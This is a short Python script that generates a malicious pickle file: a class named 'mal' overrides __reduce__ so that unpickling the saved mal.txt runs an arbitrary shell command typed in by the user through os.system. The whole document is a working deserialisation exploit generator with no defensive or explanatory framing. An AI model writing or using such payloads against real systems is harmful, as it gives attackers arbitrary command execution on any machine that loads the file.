import pickle
com=str(input("shell comand: "))
class mal:
	def __reduce__(self):
		import os
		return (os.system, (com,))
pckl=pickle.dumps(mal())
f=open("mal.txt","wb")
f.write(pckl)
f.close()
